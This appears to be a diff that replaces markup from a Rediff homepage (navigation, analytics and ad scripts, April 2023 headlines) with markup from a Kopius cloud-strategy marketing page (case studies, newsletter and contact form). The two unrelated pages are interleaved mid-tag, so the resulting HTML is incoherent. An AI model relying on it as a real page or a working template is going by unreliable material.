-            <ins data-revive-zoneid="341" data-revive-source="_blank" data-revive-target="_blank" data-revive-id="4b71f4079fb345c8ac958d0e9f0b56dd" data-zonename="Rediff_Home_OutstreamVideo_IN"></ins>
+
+<p class="has-text-align-center has-medium-font-size">Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud.</p>
+</div></div></div></div></div>
+
+
+
+<div class="wp-block-getwid-section getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal getwid-padding-tablet-top-none getwid-padding-tablet-bottom-none getwid-padding-tablet-left-normal getwid-padding-tablet-right-normal getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-normal getwid-padding-mobile-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:1440px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background has-background" style="background-color:#f9f9f9"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
+<div class="is-layout-flex wp-container-4 wp-block-columns services">
+<div class="is-layout-flow wp-block-column" style="flex-basis:50%">
+<figure class="wp-block-image size-large"><img decoding="async" width="1667" height="1667"  alt=""  data-srcset="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg 1667w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-300x300.jpg 300w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1024x1024.jpg 1024w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-150x150.jpg 150w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-768x768.jpg 768w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1536x1536.jpg 1536w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-600x600.jpg 600w"  data-src="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" data-sizes="(max-width: 1667px) 100vw, 1667px" class="wp-image-3274 lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img decoding="async" width="1667" height="1667" src="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" alt="" class="wp-image-3274" srcset="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg 1667w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-300x300.jpg 300w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1024x1024.jpg 1024w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-150x150.jpg 150w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-768x768.jpg 768w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1536x1536.jpg 1536w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-600x600.jpg 600w" sizes="(max-width: 1667px) 100vw, 1667px" /></noscript></figure>
+</div>
+
+
+
+<div class="is-layout-flow wp-block-column">
+<h3>What Can This Solution Do For You?</h3>
+
+
+
+<p>Make total use of the cloud and empower your transformation to a future-ready enterprise. The cloud is more than just a data, storage, and computing solution – it’s a transformative engine to drive business. Start with a process that identifies opportunities to address costs, security, accessibility, risk, deployment speed, and efficiency. Take the next step and introduce a new SaaS-based business model so your businesses can capture new revenue sources.</p>
+
+
+
+<div class="is-layout-flex wp-block-buttons">
+<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="http://kopius.wpengine.com/contact-us/">Contact Us</a></div>
+</div>
+</div>
+</div>
+</div></div></div></div></div>
+
+
+
+<div style="height:40px" aria-hidden="true" class="wp-block-spacer"></div>
+
+
+
+<div class="wp-block-getwid-section getwid-section-content-custom-width" style="margin-top:0px"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal getwid-padding-tablet-top-none getwid-padding-tablet-bottom-none getwid-padding-tablet-left-normal getwid-padding-tablet-right-normal getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-normal getwid-padding-mobile-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:1440px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
+<h3>Case Studies</h3>
+
+
+
+<div style="height:32px" aria-hidden="true" class="wp-block-spacer"></div>
+
+
+
+        <div class="wp-block-getwid-post-carousel custom-post-type-crown_case_studies has-slides-gap-large is-carousel has-arrows-outside has-dots-none">
+            <div data-slider-option="{&quot;sliderSlidesToShowDesktop&quot;:&quot;3&quot;,&quot;getwid_slidesToShowLaptop&quot;:&quot;1&quot;,&quot;getwid_slidesToShowTablet&quot;:&quot;1&quot;,&quot;getwid_slidesToShowMobile&quot;:&quot;1&quot;,&quot;getwid_autoplay_speed&quot;:6000,&quot;getwid_animation_speed&quot;:800,&quot;getwid_slidesToScroll&quot;:&quot;1&quot;,&quot;getwid_autoplay&quot;:false,&quot;getwid_infinite&quot;:true,&quot;getwid_center_mode&quot;:false,&quot;getwid_arrows&quot;:&quot;outside&quot;,&quot;getwid_dots&quot;:&quot;none&quot;}" class="wp-block-getwid-post-carousel__wrapper">
+                							<div class="wp-block-getwid-post-carousel__slide">
+								
+<div class="wp-block-getwid-post-carousel__post">
+            <div class="wp-block-getwid-post-carousel__post-thumbnail">
+            <a href="https://kopiustech.com/case-studies/cloud-enablement-precisionhawk/"><img width="1092" height="613"   alt="" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png 1092w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-300x168.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-1024x575.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-768x431.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png" data-sizes="(max-width: 1092px) 100vw, 1092px" class="attachment-post-thumbnail size-post-thumbnail wp-post-image lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1092" height="613" src="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png 1092w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-300x168.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-1024x575.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-768x431.png 768w" sizes="(max-width: 1092px) 100vw, 1092px" /></noscript></a>
         </div>
-        <div class="logobar">
-            <div class="table">
-                <div class="cell">
-                    <span class="hmsprite logo"></span>
-                </div>
-                <div class="cell topicons">
-                    <a href="https://mail.rediff.com/cgi-bin/login.cgi" title="Lightning fast free email" class="mailicon">Rediffmail</a>
-                    <a href="https://money.rediff.com" title="Live commentary of the Indian stock markets, stock quotes and business news" onclick="trackURL('https://track.rediff.com/click?url=___https://money.rediff.com/___&position=nav1&label=money&property=hp_in_pc');return false;" class="moneyicon relative">Money</a>
-                    <a href="https://workmail.rediff.com?sc_cid=inhome" onclick="trackURL('https://track.rediff.com/click?url=___https://workmail.rediff.com?sc_cid=inhome___&position=nav1&label=enterpriseemail&property=hp_in_pc');return false;" title="Enterprise Email" class="eproicon relative">Enterprise Email</a>
-                    <a href="https://ishare.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=nav1&label=videos&property=hp_in_pc');return false;" title="Watch videos" class="vdicon">Videos</a>
-                    <a href="https://businessemail.rediff.com?sc_cid=inhome" title="Lightning fast business email hosting" onclick="trackURL('https://track.rediff.com/click?url=___https://businessemail.rediff.com?sc_cid=inhome___&position=nav1&label=businessemail&property=hp_in_pc');return false;" class="bmailicon relative">Business Email</a>
-                    <a href="https://gurus.rediff.com?utm_source=rediff_home_icon&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_icon_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https://gurus.rediff.com?utm_source=rediff_home_icon&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_icon_pc___&position=nav1&label=rediffgurus&property=hp_in_pc');return false;" title="rediffGURUS" class="shopicon relative">rediffGURUS</a>
-                </div>
-                <div class="cell alignR toprlinks">
-                    <span id="username" class="username"></span>
-                    <p id="signin_info">
-                        <a href='https://mail.rediff.com/cgi-bin/login.cgi' class="signin">Sign in</a>
-                        <br/>
-                        <a href='https://register.rediff.com/register/register.php?FormName=user_details' title="Create Rediffmail Account">Create Account</a>
-                    </p>
-                    <!-- Begin comScore Tag -->
-                    <script>
-                        var _comscore = _comscore || [];
-                        _comscore.push({
-                            c1: "2",
-                            c2: "6035613"
-                        });
-                        (function() {
-                            var s = document.createElement("script")
-                              , el = document.getElementsByTagName("script")[0];
-                            s.async = true;
-                            s.src = "https://sb.scorecardresearch.com/cs/6035613/beacon.js";
-                            el.parentNode.insertBefore(s, el);
-                        }
-                        )();
-                    </script>
-                    <noscript>
-                        <img src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=6035613&amp;cv=3.6.0&amp;cj=1" alt="comscore">
-                    </noscript>
-                    <!-- End comScore Tag -->
-                    <script>
+        <div class="wp-block-getwid-post-carousel__post-content-wrapper">
+        <div class="wp-block-getwid-post-carousel__post-header">
+            <h3 class="wp-block-getwid-post-carousel__post-title"><a href="https://kopiustech.com/case-studies/cloud-enablement-precisionhawk/">Cloud Enablement</a></h3>        </div>
+        <div class="wp-block-getwid-post-carousel__post-excerpt"><p>PrecisionHawk</p>
+</div>
+    </div>
+</div>
 
-                        var ck = document.cookie;
-                        function getcookie(n) {
-                            var ar = n + "=";
-                            var al = ar.length;
-                            var cl = ck.length;
-                            var i = 0;
-                            while (i < cl) {
-                                j = i + al;
-                                if (ck.substring(i, j) == ar) {
-                                    e = ck.indexOf(";", j);
-                                    if (e == -1)
-                                        e = ck.length;
-                                    return unescape(ck.substring(j, e));
-                                }
-                                i = ck.indexOf(" ", i) + 1;
-                                if (i == 0)
-                                    break;
-                            }
-                            return "";
-                        }
-                        var querystring = "";
-                        var path = "";
-                        var domain = "";
-                        var Rkey_data = "";
-                        var Rkey = Math.floor(Math.random() * 1000000);
-                        querystring = window.location.search;
-                        path = window.location.pathname;
-                        domain = window.location.host;
-                        var tmp_ref = encodeURIComponent(document.referrer);
-                        if ((tmp_ref == null) || (tmp_ref.length == 0)) {
-                            tmp_ref = "";
-                        }
-                        var resolution = screen.width + 'x' + screen.height;
-                        if (querystring == "") {
-                            Rkey_data = "?rkey=" + Rkey + "&w=" + resolution;
-                        } else {
-                            Rkey_data = "&rkey=" + Rkey + "&w=" + resolution;
-                        }
-                        if (tmp_ref != "") {
-                            Rkey_data += "&ref=" + tmp_ref;
-                        }
-                        var metriccall_img = new Image();
-                        metriccall_img.src = '//indmetric.rediff.com/' + domain + path + querystring + Rkey_data + '&device=pc';
-
-                        var Rlo = "";
-                        var Rl = "";
-                        Rlo = getcookie("Rlo");
-                        Rlo = unescape(Rlo).replace(/\+/g, " ");
-                        Rlo = Rlo.replace("@rediffmail.com", "");
-                        Rlo = Rlo.replace(/[^\w\d\s\-\_]/ig, '');
-                        Rl = getcookie("Rl");
-                        Rl = Rl.replace(/[^\w\d\s\-\_@\.]/ig, '');
-                        var tmp_rsc1 = "";
-                        tmp_rsc1 = getcookie("Rsc");
-                    </script>
-                </div>
-            </div>
+							</div>
+													<div class="wp-block-getwid-post-carousel__slide">
+								
+<div class="wp-block-getwid-post-carousel__post">
+            <div class="wp-block-getwid-post-carousel__post-thumbnail">
+            <a href="https://kopiustech.com/case-studies/cloud-enablement-machine-learning/"><img width="1096" height="616"   alt="" decoding="async" loading="lazy" data-srcset="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png 1096w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-300x169.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-1024x576.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-768x432.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png" data-sizes="(max-width: 1096px) 100vw, 1096px" class="attachment-post-thumbnail size-post-thumbnail wp-post-image lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1096" height="616" src="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png 1096w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-300x169.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-1024x576.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-768x432.png 768w" sizes="(max-width: 1096px) 100vw, 1096px" /></noscript></a>
         </div>
-        <div class="srchbar clear-fix relative">
-            <div class="div_moneyframe relative">
-                <iframe id="moneyiframe" name="moneyiframe" width="670" height="28" src="about:blank" title="Rediff Money Widget" class="moneyiframe"></iframe>
-            </div>
-            <div class="srchcontainer hide">
-                <div id="topsrchhome">
-                    <form name="srchform" id="queryTop" method="post" action="https://shopping.rediff.com/">
-                        <div class="srch_outer">
-                            <input type="text" autocomplete="off" id="srchword" name="srchword" class="homesrchbox" aria-label="Search for" placeholder="Search for a product, category or brand"/>
-                            <input type="hidden" name="src" id="snsSRC" value="web"/>
-                            <input type="hidden" id="srchurl" value="https://shopping.rediff.com/product/"/>
-                            <input type="hidden" id="srchservice" value="shopping"/>
-                            <input type="hidden" id="srchsugtrack" value=""/>
+        <div class="wp-block-getwid-post-carousel__post-content-wrapper">
+        <div class="wp-block-getwid-post-carousel__post-header">
+            <h3 class="wp-block-getwid-post-carousel__post-title"><a href="https://kopiustech.com/case-studies/cloud-enablement-machine-learning/">Cloud Enablement and Machine Learning</a></h3>        </div>
+        <div class="wp-block-getwid-post-carousel__post-excerpt"><p>Fortune 500 Insurance Company  </p>
+</div>
+    </div>
+</div>
+
+							</div>
+						            </div>
+        </div>
+        </div></div></div></div></div>
+
+
+
+<div class="wp-block-getwid-section full-width-newsletter getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-large getwid-padding-mobile-right-large" style="padding-top:78px;padding-bottom:78px;padding-left:136px;padding-right:136px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:850px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
+<h6 class="has-text-align-center has-white-color has-text-color">NEWSLETTER</h6>
+
+
+
+<h2 class="has-text-align-center has-white-color has-text-color">Never miss the latest news and insights from Kopius. </h2>
+
+
+
+<div class="is-content-justification-center is-layout-flex wp-container-5 wp-block-buttons">
+<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="http://kopius.wpengine.com/insights-innovation#newsletter" style="border-radius:0px">Sign Up</a></div>
+</div>
+</div></div></div></div></div>
+
+
+
+<div class="crown-connect"><div class="two-col"><div class="left" style="background:#000000"><h6 class="subtitle" style="color:#ffffff">CONTACT US</h6><h1 class="collapsible" style="color:#ffffff">Let&#8217;s<br/>Connect</h1><p style="color:#ffffff">We love talking about technology, business, and design. Join the conversation.<br/><br/><a href="https://kopiustech.com/contact-us/">Contact Us →</a></p></div><div class="right" style="background:gray;background-image:url(http://kopius.wpengine.com/wp-content/uploads/2021/06/Screen-Shot-2022-12-02-at-12.02.41-PM.png);background-size:cover;background-position:center"><h5 class="subtitle" style="color:#000000">HOW CAN WE HELP</h5><div class="form"><div class="content">
+                <div class='gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework' data-form-theme='gravity-theme' data-form-index='0' id='gform_wrapper_1' ><div id='gf_1' class='gform_anchor' tabindex='-1'></div>
+                        <div class='gform_heading'>
+                            <p class='gform_description'>Your digital journey starts here</p>
+                        </div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_1' id='gform_1'  action='/capabilities/cloud-strategy/#gf_1' data-formid='1' novalidate>
+                        <div class='gform-body gform_body'><div id='gform_fields_1' class='gform_fields top_label form_sublabel_below description_below'><div id="field_1_1"  class="gfield gfield--type-text gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_1"><label class='gfield_label gform-field-label' for='input_1_1' >Full Name<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_text'><input name='input_1' id='input_1_1' type='text' value='' class='large'     aria-required="true" aria-invalid="false"   /> </div></div><div id="field_1_2"  class="gfield gfield--type-email gfield--width-full gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_2"><label class='gfield_label gform-field-label' for='input_1_2' >Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
+                            <input name='input_2' id='input_1_2' type='email' value='' class='large'    aria-required="true" aria-invalid="false"  />
+                        </div></div><div id="field_1_8"  class="gfield gfield--type-text gfield--width-full field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_8"><label class='gfield_label gform-field-label' for='input_1_8' >Phone Number (Optional)</label><div class='ginput_container ginput_container_text'><input name='input_8' id='input_1_8' type='text' value='' class='large'      aria-invalid="false"   /> </div></div><div id="field_1_3"  class="gfield gfield--type-textarea gfield--width-full gfield_contains_required field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_3"><label class='gfield_label gform-field-label' for='input_1_3' >Message<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_textarea'><textarea name='input_3' id='input_1_3' class='textarea large'     aria-required="true" aria-invalid="false"   rows='10' cols='50'></textarea></div></div><div id="field_1_4"  class="gfield gfield--type-captcha gfield--width-full field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_4"><label class='gfield_label gform-field-label' for='input_1_4' >CAPTCHA</label><div id='input_1_4' class='ginput_container ginput_recaptcha' data-sitekey='6Ld2-xElAAAAAKDeEQDoRf58Ifx_Qm6dUlDYweM0'  data-theme='light' data-tabindex='0'  data-badge=''></div></div><div id="field_1_7"  class="gfield gfield--type-text field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_7"><label class='gfield_label gform-field-label' for='input_1_7' >Untitled</label><div class='ginput_container ginput_container_text'><input name='input_7' id='input_1_7' type='text' value='' class='large'      aria-invalid="false"   /> </div></div><div id="field_1_9"  class="gfield gfield--type-honeypot gform_validation_container field_sublabel_below gfield--has-description field_description_below gfield_visibility_visible"  data-js-reload="field_1_9"><label class='gfield_label gform-field-label' for='input_1_9' >Email</label><div class='ginput_container'><input name='input_9' id='input_1_9' type='text' value='' autocomplete='new-password'/></div><div class='gfield_description' id='gfield_description_1_9'>This field is for validation purposes and should be left unchanged.</div></div></div></div>
+        <div class='gform_footer top_label'> <input type='submit' id='gform_submit_button_1' class='gform_button button' value='Submit'  onclick='if(window["gf_submitting_1"]){return false;}  if( !jQuery("#gform_1")[0].checkValidity || jQuery("#gform_1")[0].checkValidity()){window["gf_submitting_1"]=true;}  ' onkeypress='if( event.keyCode == 13 ){ if(window["gf_submitting_1"]){return false;} if( !jQuery("#gform_1")[0].checkValidity || jQuery("#gform_1")[0].checkValidity()){window["gf_submitting_1"]=true;}  jQuery("#gform_1").trigger("submit",[true]); }' /> <input type='hidden' name='gform_ajax' value='form_id=1&amp;title=&amp;description=1&amp;tabindex=0' />
+            <input type='hidden' class='gform_hidden' name='is_submit_1' value='1' />
+            <input type='hidden' class='gform_hidden' name='gform_submit' value='1' />
+            
+            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
+            <input type='hidden' class='gform_hidden' name='state_1' value='WyJbXSIsImMxNjFiN2Q1OTlhNmJhMzlhOTBjMTFjNzJhMmY1MzU1Il0=' />
+            <input type='hidden' class='gform_hidden' name='gform_target_page_number_1' id='gform_target_page_number_1' value='0' />
+            <input type='hidden' class='gform_hidden' name='gform_source_page_number_1' id='gform_source_page_number_1' value='1' />
+            <input type='hidden' name='gform_field_values' value='' />
+            
+        </div>
+                        </form>
                         </div>
-                        <input type="submit" value=" " class="newsrchbtn" aria-label="Search"/>
-                        <i class="clear"></i>
-                    </form>
-                    <div id="sug" class="sug"></div>
-                </div>
-            </div>
-        </div>
-        <div id="div_advt_x01" class="div_advt_x01">
-            <script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
-            <script>
-                var googletag = googletag || {};
-                googletag.cmd = googletag.cmd || [];
-            </script>
-            <div id='div-gpt-ad-1531738694552-0'>
-                <script>
-                    googletag.cmd.push(function() {
-                        googletag.defineSlot('/21677187305/Rediff_Home_728x90_ATF_IN', [[970, 250], [970, 90], [728, 90]], 'div-gpt-ad-1531738694552-0').addService(googletag.pubads());
-                        googletag.pubads().collapseEmptyDivs();
-                        googletag.enableServices();
-                        googletag.display('div-gpt-ad-1531738694552-0');
-                    });
-                </script>
-            </div>
-        </div>
-        <div class="navbar ">
-            <ul class="navbarul">
-                <li>&nbsp;HOME</li>
-                <li class="news">
-                    <a href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=nav2&label=news&c_type=edit_news&property=hp_in_pc');return false;">NEWS</a>
-                </li>
-                <li class="business">
-                    <a href="https://www.rediff.com/business" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/business___&position=nav2&label=business&c_type=edit_business&property=hp_in_pc');return false;">BUSINESS</a>
-                </li>
-                <li class="movies">
-                    <a href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=nav2&label=movies&c_type=edit_movies&property=hp_in_pc');return false;">MOVIES</a>
-                </li>
-                <li class="cricket">
-                    <a href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=nav2&label=cricket&c_type=edit_cricket&property=hp_in_pc');return false;">CRICKET</a>
-                </li>
-                <li class="sports">
-                    <a href="https://www.rediff.com/sports" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/sports___&position=nav2&label=sports&c_type=edit_sports&property=hp_in_pc');return false;">SPORTS</a>
-                </li>
-                <li class="getahead">
-                    <a href="https://www.rediff.com/getahead" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=nav2&label=getahead&c_type=edit_getahead&property=hp_in_pc');return false;">GET AHEAD</a>
-                </li>
-                <li class="news">
-                    <a href="https://realtime.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://realtime.rediff.com___&position=nav2&label=realtimenews&c_type=realtimenews&property=hp_in_pc');return false;">REALTIME NEWS</a>
-                </li>
-                <li>
-                    <a href="https://www.rediff.com/cricket/ipl-2023/headlines" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket/ipl-2023/headlines___&position=nav2&label=ipl2023&c_type=ipl2023&property=hp_in_pc');return false;">IPL 2023</a>
-                </li>
-            </ul>
-            <div class="div_newssearch">
-                <form name="newsrchform" onsubmit="return submitNewsSearch()" action="https://www.rediff.com/search" method="POST">
-                    <label for="srchquery_tbox" class="hlabel">Search</label>
-                    <input type="text" id="srchquery_tbox" name="srchquery_tbox" value="" class="txt_srchquery" autocomplete="off" placeholder="Search news"/>
-                    <input type="submit" value="" class="newsrchbtn"/>
-                </form>
-            </div>
-            <i id="subnews_icon" class="subnews_icon"></i>
-            <div id="div_subscribe_nl" class="div_subscribe_nl">
-                <form name="frm_subscription_in_top" method="POST" id="frm_subscription_in_top">
-                    <div>
-                        <span class="getnews">Get Rediff News</span>
-                        in your Inbox
-                    </div>
-                    <label class="hlabel" for="sub_email_in_top">email</label>
-                    <input type="text" onkeypress="if(event.keyCode==13){return subscribeNewsletterHome('sub_email_in_top','subscribe_btn_in_top');}" autocomplete="off" id="sub_email_in_top" name="sub_email_in_top" placeholder="Email Address" class="sub_email_in">
-                    <input type="button" onclick="return subscribeNewsletterHome('sub_email_in_top','subscribe_btn_in_top');" value="Keep Me Updated" id="subscribe_btn_in_top" class="subscribe_btn_in">
-                    <i id="subwait_top" class="subwait"></i>
-                    <span id="cancel_btn" class="cancel_btn" title="Close this box">Cancel</span>
-                </form>
-                <div id="div_thanks" class="div_thanks"></div>
-                <div id="div_err_message" class="div_err_message"></div>
-            </div>
-        </div>
-        <!-- red_container starts -->
-        <div id="red_container_main" class="red_container">
-            <div class="firstrow">
-                <div class="secstorybox topboxheight corona topstories">
-                    <div id="tabtable" class="tabtable corona">
-                        <div class="tabs active" data-tabno="0">TOP STORIES</div>
-                        <div class='tabs' data-tabno='1'>LATEST</div>
-                        <div id="lasttab" class='tabs hide' data-tabno='2'>FOR YOU</div>
-                    </div>
-                    <i class="clear"></i>
-                    <div id="topdiv_0">
-                        <h2 class="live" data-boxno="1_1-2_1" data-track="label=edit_topstories&c_type=edit_news&news=https%3A%2F%2Fnews.rediff.com%2Fcommentary%2F2023%2Fapr%2F18%2Fliveupdates.htm">
-                            <a href="https://news.rediff.com/commentary/2023/apr/18/liveupdates.htm" title="LIVE! NHRC issues notice to UP police for Atiq killing" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fnews.rediff.com%2Fcommentary%2F2023%2Fapr%2F18%2Fliveupdates.htm___&position=1_1-2_1&label=edit_topstories&c_type=edit_news&property=hp_in_pc');return false;">NHRC issues notice to UP police for Atiq killing</a>
-                        </h2>
-                        <h2 class="news" data-boxno="1_1-2_2" data-track="label=edit_topstories&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fkarnataka-tribals-stranded-in-war-torn-sudan%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/report/karnataka-tribals-stranded-in-war-torn-sudan/20230418.htm" title="31 Karnataka tribals stranded in war-torn Sudan" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fkarnataka-tribals-stranded-in-war-torn-sudan%2F20230418.htm___&position=1_1-2_2&label=edit_topstories&c_type=edit_news&property=hp_in_pc');return false;">31 Karnataka tribals stranded in war-torn Sudan</a>
-                        </h2>
-                        <h2 class="news" data-boxno="1_1-2_3" data-track="label=edit_topstories&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fbrigadier-israr-khan-we-crossed-over-into-pakistan-at-2-am%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/interview/brigadier-israr-khan-we-crossed-over-into-pakistan-at-2-am/20230418.htm" title="'We crossed over into Pakistan at 2 am'" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fbrigadier-israr-khan-we-crossed-over-into-pakistan-at-2-am%2F20230418.htm___&position=1_1-2_3&label=edit_topstories&c_type=edit_news&property=hp_in_pc');return false;">'We crossed over into Pakistan at 2 am'</a>
-                        </h2>
-                        <h2 class="news" data-boxno="1_1-2_4" data-track="label=edit_topstories&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Funnao-gang-rape-survivors-house-set-on-fire-2-infants-sustain-burns%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/report/unnao-gang-rape-survivors-house-set-on-fire-2-infants-sustain-burns/20230418.htm" title="Unnao gang-rape accused set survivor's house on fire" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Funnao-gang-rape-survivors-house-set-on-fire-2-infants-sustain-burns%2F20230418.htm___&position=1_1-2_4&label=edit_topstories&c_type=edit_news&property=hp_in_pc');return false;">Unnao gang-rape accused set survivor's house on fire</a>
-                        </h2>
-                        <h2 class="news" data-boxno="1_1-2_5" data-track="label=edit_topstories&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fcrude-bomb-thrown-near-prayagraj-home-of-atiqs-lawyer%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/report/crude-bomb-thrown-near-prayagraj-home-of-atiqs-lawyer/20230418.htm" title="Crude bomb thrown near Prayagraj home of Atiq's lawyer" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fcrude-bomb-thrown-near-prayagraj-home-of-atiqs-lawyer%2F20230418.htm___&position=1_1-2_5&label=edit_topstories&c_type=edit_news&property=hp_in_pc');return false;">Crude bomb thrown near Prayagraj home of Atiq's lawyer</a>
-                        </h2>
